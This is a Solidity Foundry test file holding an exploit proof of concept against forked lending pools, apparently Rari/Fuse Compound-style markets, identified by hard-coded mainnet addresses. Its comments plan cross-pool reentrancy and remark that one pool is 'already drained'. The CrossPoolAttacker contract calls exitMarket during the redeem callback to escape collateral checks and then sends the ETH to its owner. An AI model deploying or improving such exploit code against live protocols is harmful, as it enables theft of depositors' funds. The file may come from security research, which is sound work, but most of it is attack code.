// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IComptroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
    function exitMarket(address) external returns (uint256);
    function getAccountLiquidity(address) external view returns (uint256, uint256, uint256);
}

interface ICEther {
    function mint() external payable;
    function redeem(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrow(uint256) external returns (uint256);
}

interface ICErc20 {
    function mint(uint256) external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function redeem(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function underlying() external view returns (address);
}

// Strategy: supply stablecoins, borrow ETH (paused?), use callback...
// Alternative: what about using exitMarket during redeem callback?
// Flow: mint fETH -> enterMarket(fETH) -> borrow DAI -> redeemUnderlying(tiny ETH) -> callback -> exitMarket(fETH)
// Problem: we already have DAI borrow, so exitMarket checks borrow balance

// NEW idea: What about CROSS-POOL reentrancy?
// Pool 6 CEther redeem -> callback -> borrow from DIFFERENT pool?
// The reentrancy guard is per-comptroller, not global!

contract CrossPoolAttacker {
    // Pool 6 (CEther mint/redeem unpaused, borrow paused)
    address constant COMP6 = 0x814b02C1ebc9164972D888495927fe1697F0Fb4c;
    address constant F6_ETH = 0xF6551C22276b9Bf62FaD09f6bD6Cad0264b89789;
    address constant F_DAI_6 = 0x989273ec41274C4227bCB878C2c26fdd3afbE70d;

    // Pool 8 (CEther borrow unpaused, but already drained to 1 ETH)
    address constant COMP8 = 0xc54172e34046c1653d1920d40333Dd358c7a1aF4;
    address constant F8_ETH = 0xbB025D470162CC5eA24daF7d4566064EE7f5F111;
    address constant F_DAI_8 = 0x7e9cE3CAa9910cc048590801e64174957Ed41d43;

    address payable public immutable owner;
    bool public inRedeem;

    constructor() { owner = payable(msg.sender); }

    // Try: mint into Pool 6 fETH, then during redeem callback, try to interact with Pool 6's fDAI
    // using a different entry point (mint, not borrow)
    function attack() external payable {
        require(msg.sender == owner);
        console.log("=== Cross-Pool / Exit-Redeem Test ===");

        // Mint fETH in Pool 6
        ICEther(F6_ETH).mint{value: msg.value}();
        uint256 cBal = ICEther(F6_ETH).balanceOf(address(this));
        console.log("fETH-6 cTokens:", cBal);

        // Enter fETH market
        address[] memory m = new address[](1);
        m[0] = F6_ETH;
        IComptroller(COMP6).enterMarkets(m);

        // Try to redeem - during callback, try exitMarket
        // (This should work since we have no borrows)
        inRedeem = true;
        uint256 redeemAmt = msg.value - 0.01 ether; // keep tiny amount
        console.log("Redeeming:", redeemAmt / 1e18, "ETH");

        uint256 res = ICEther(F6_ETH).redeemUnderlying(redeemAmt);
        inRedeem = false;
        console.log("Redeem result:", res);

        // Send everything home
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    uint256 public exitCode;

    receive() external payable {
        if (!inRedeem || msg.sender != F6_ETH) return;
        console.log("=== CALLBACK ===");

        // During callback: cTokens not burned yet
        // We have no borrows, so exitMarket should succeed
        exitCode = IComptroller(COMP6).exitMarket(F6_ETH);
        console.log("exitMarket code:", exitCode);

        if (exitCode == 0) {
            // We've exited! Now redeem the remaining cTokens
            uint256 remaining = ICEther(F6_ETH).balanceOf(address(this));
            console.log("Remaining cTokens after exit:", remaining);
            // Can we redeem more? The redeem in progress will burn some tokens.
            // But we've exited the market, so no collateral check needed.
        }
    }
}

contract Pool6ExitRedeemTest is Test {
    function test_exit_during_redeem() external {
        vm.deal(address(this), 110 ether);
        CrossPoolAttacker att = new CrossPoolAttacker();
        att.attack{value: 100 ether}();
        console.log("Exit code:", att.exitCode());
        console.log("Final ETH:", address(this).balance / 1e18);
    }
    receive() external payable {}
}
